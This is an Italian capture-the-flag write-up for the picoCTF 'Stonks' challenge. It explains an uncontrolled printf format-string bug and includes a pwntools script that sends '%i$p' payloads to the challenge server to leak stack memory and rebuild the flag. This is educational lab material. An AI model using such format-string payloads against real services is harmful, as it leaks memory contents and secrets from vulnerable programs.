# Stonks
*I decided to try something noone else has before. I made a bot to automatically trade stonks for me using AI and machine learning. I wouldn't believe you if you told me it's unsecure! 
`nc mercury.picoctf.net 33411`*
<br>

## Soluzione
La funzione **buy_stonks** legge la flag all'interno dello stack e poi chiede all'utente di immettere un'input prima, per poi stamparlo con **printf**: è presente quindi la vulnerabilità [Stringa di formato non controllata](https://www.no-regime.com/ru-it/wiki/Format_string_attack).

Passando quindi `%x` o `%p` possiamo **leggere lo stack**.

![[stonks-1.png]]

Invece di inserire a mano e poi convertire l'output, utilizziamo uno script python.

*La flag parte dal 15esimo DWORD (32bit) dello stack*

```python
from pwn import *

flag = b''
for i in range(15, 25):
    with context.local(log_level = "error"):
        r = remote("mercury.picoctf.net", 33411)
        r.sendlineafter("What would you like to do?\n", "1")
        r.sendlineafter("What is your API token?\n", f"%{i}$p")
        r.recvuntilS("Buying stonks with token:\n")
        out = r.recvline()
        try:
			# Convertiamo da numero a 32bit hex a bytes (se possibile)
            res = p32(int(out.decode(), 16))
            flag += res
        except Exception:
            pass
        r.recvall()

print(flag)
```
<br>

**NB**. Era anche possibile stampare lo stack con un semplice ciclo FOR e poi convertire da esadecimale e cambiare l'ordine dei byte da Little Endian a Big Endian.

---
[Stringa di formato non controllata](https://www.no-regime.com/ru-it/wiki/Format_string_attack)
[Ordine dei byte](https://it.wikipedia.org/wiki/Ordine_dei_byte)
[Soluzione 1](https://github.com/Dvd848/CTFs/blob/master/2021_picoCTF/Stonks.md)
[Soluzione 2](https://dmfrsecurity.com/2021/04/07/picoctf-2021-stonks-writeup/)
